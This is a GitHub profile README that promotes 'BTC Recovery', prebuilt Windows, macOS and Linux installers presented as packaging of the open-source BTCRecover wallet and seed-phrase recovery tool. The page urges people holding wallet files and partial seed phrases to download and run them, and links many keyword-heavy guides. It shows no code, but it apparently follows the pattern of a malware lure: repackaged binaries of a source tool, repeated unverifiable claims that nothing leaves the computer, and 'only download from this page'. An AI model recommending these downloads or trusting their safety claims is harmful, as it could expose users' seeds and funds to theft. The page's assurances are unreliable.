<div align="center">
<img src="assets/banner-profile.png" alt="BTC Recovery">
</div>

<h1 align="center">BTC Recovery</h1>

<p align="center">Offline Bitcoin wallet and seed phrase recovery for Windows, macOS and Linux.</p>

<div align="center">
<a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-GPL--2.0-FCB036?style=for-the-badge&labelColor=191008" alt="License: GPL-2.0"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1"><img src="https://img.shields.io/badge/RELEASE-v2.1.1-FCB036?style=for-the-badge&labelColor=191008" alt="Release v2.1.1"></a>
</div>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

## What this repository is for

This repository is the profile page for BTC Recovery, and it is where the whole project is meant to be read from one place. BTC Recovery is a desktop tool for getting back into a Bitcoin wallet you still have something of: a `wallet.dat`, an Electrum file, a MetaMask vault, a phrase missing words, or a BIP39 passphrase you only half remember. It runs the search on your own machine, offline, and it reports what it finds without sending a wallet file, a seed or a password anywhere. The rest of the account is arranged around that one job. The application repository carries the current release and the installers. Three guide repositories carry forty how-to pages, split by what the reader is actually holding: a phrase, a wallet file with a password, or a question about safety, odds and the command line. This page is the index to all of it, with the six guides worth reading first and a short explanation of which one answers which situation.

## Who it is for

- You have part of a seed phrase and need to work out the rest before you move the funds anywhere.
- You have a wallet file and a password you cannot reproduce exactly, and you want to test candidates locally.
- You restored a phrase that was accepted and opened an empty wallet, and you need to know which setting is wrong.
- You are helping someone else recover access and you want the process written down step by step, with the risks named.

## Start here

- If words are missing, start with the seed-phrase guides: [btcrecover-seed-phrase-recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) explains the whole search and when it can succeed.
- If you have a file and no password, start with [bitcoin-wallet-password-recovery-with-btcrecover](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md), which covers the wallet-file cases.
- Before you run anything against a wallet that holds a balance, read [is-btcrecover-safe](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md), which covers what to check and what to keep offline.
- If you are unsure what you are holding, read [what-is-a-recovery-phrase-btcrecover](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/what-is-a-recovery-phrase-btcrecover.md) first, then come back to the matching guide.

## How to use these guides

1. Name what you still have: words, a file, a password, or a device. That single answer picks the guide.
2. Open the guide for that situation and read the first table, which maps what you see to what it usually means.
3. Confirm you can prove the wallet is yours: one address, one transaction, one withdrawal record. Every search needs something to check against.
4. Install the current release from the application repository and keep the wallet data on the same machine.
5. Work through the fix steps in order and stop when a candidate is confirmed, rather than trying several methods at once.

## The guides, grouped

| Guide | What it answers |
| --- | --- |
| [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) | A seed phrase can be recovered when part of it still exists. |
| [Bitcoin wallet recovery tool: what it does and when it works](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-bitcoin-wallet-recovery-tool.md) | It runs offline on Windows, macOS and Linux, works on the file or phrase you already hold, and sends nothing anywhere. |
| [How to recover a Bitcoin wallet with a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/recover-bitcoin-wallet-with-seed-phrase-btcrecover.md) | A seed phrase regenerates a wallet rather than unlocking a file, so a complete phrase restored into the right wallet type brings the keys back. |
| [Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md) | A Bitcoin wallet password protects a file on your disk; it is not the seed phrase and not a private key. |
| [How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md) | A Bitcoin address is not a wallet and cannot rebuild one, but it is the anchor that makes a partial recovery checkable. |
| [Is BTCRecover safe, and how to check a download](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md) | BTCRecover is free, open-source software that runs offline and needs nothing sent anywhere, which makes it safe in the way that matters for a recovery tool. |

The full list of forty guides is in [the tool guides index](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool).

## What each guide changes

| Your situation | Guide | What you end up with |
| --- | --- | --- |
| You have some of the words and do not know which are missing | [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) | A bounded search over the unknown positions, checked against one address of yours. |
| The phrase is accepted but the balance reads zero | [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md) | The wallet type and path that produced the address you remember, tested one by one. |
| A wallet file needs a password you cannot retype | [Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md) | Candidates built from what you remember and tested against the file, offline. |
| You want to know whether a recovery is realistic at all | [Recovery odds, search space and time](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-recovery-odds-and-time.md) | The size of the search space for your situation, in plain arithmetic. |
| You are about to install something that touches a live wallet | [Is BTCRecover safe, and how to check a download](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md) | The checks that keep the phrase and the file on your own machine. |
| You are scripting the run or repeating it | [BTCRecover command-line options](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-command-line-options.md) | The options and token lists that make a run repeatable. |

## Common first questions

### Does anything leave my computer?

No part of a recovery run sends a wallet file, a seed phrase or a password to a server. The search runs locally and the result is printed on your screen.

### Can BTC Recovery rebuild a phrase I never wrote down?

It can fill positions you do not know and reorder words you do, because each of those is a bounded question. It cannot invent a phrase that was never recorded anywhere.

### Is this a hosted service?

No. It is a desktop application published as a release in the application repository, with an installer for Windows, macOS and Linux.

### Which guide applies if I only have a password?

The wallet-file and password guides, which start from a `wallet.dat`, an Electrum file or another encrypted container rather than a phrase.

## Before you install

BTC Recovery is built on BTCRecover, the open-source recovery tool published under the GPL-2.0 licence, and it is distributed under the same licence. It is a local tool: there is no account to create and no dashboard to log in to. Install it from the release page of the application repository, keep the wallet data on the machine where you run it, and disconnect the network for the run itself. If a page, a service or a person asks you to paste a seed phrase into a website, that is not this tool and it is not a recovery method.

## About

BTC Recovery is maintained on this account as one product: one application repository with the signed release, three guide repositories grouped by the reader's situation, and this profile page tying them together. The guides are written for people mid-problem, not for a marketing reader, so they start with what you see on screen and work back to the cause. Nothing on this account asks for a payment, an account or a phrase.

## License

This repository is released under the GPL-2.0 licence, and the full text is in [LICENSE](LICENSE).

---

**BTC Recovery** - offline Bitcoin wallet recovery for Windows, macOS and Linux.

Links: [the profile](https://github.com/btc-wallet-recovery/btc-wallet-recovery) - [the application](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software) - [the seed phrase guides](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery) - [the wallet file guides](https://github.com/btc-wallet-recovery/btcrecover-password-recovery) - [the tool guides](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool).
